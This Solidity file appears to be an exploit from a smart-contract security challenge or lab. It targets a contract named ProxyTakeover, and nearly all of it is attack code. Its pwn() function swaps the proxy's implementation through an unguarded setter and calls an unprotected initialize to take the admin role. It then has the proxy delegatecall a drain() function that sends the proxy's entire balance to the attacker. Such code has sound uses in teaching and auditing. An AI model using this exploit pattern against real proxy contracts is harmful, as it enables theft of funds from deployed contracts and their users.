// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ProxyTakeover} from "../src/ProxyTakeover.sol";

contract MaliciousLogic {
    function drain() external {
        (bool ok, ) = msg.sender.call{value: address(this).balance}("");
        require(ok, "send failed");
    }
}

contract ProxyAttack {
    ProxyTakeover public proxy;
    MaliciousLogic public logic;

    constructor(address _proxy) {
        proxy = ProxyTakeover(_proxy);
        logic = new MaliciousLogic();
    }

    function pwn() external {
        // 1. No access control on setImplementation
        proxy.setImplementation(address(logic));
        // 2. Unprotected initialize → become admin
        proxy.initialize(address(this));
        // 3. Delegatecall drain() — runs in proxy context
        proxy.execute(abi.encodeWithSelector(MaliciousLogic.drain.selector));
    }

    receive() external payable {}
}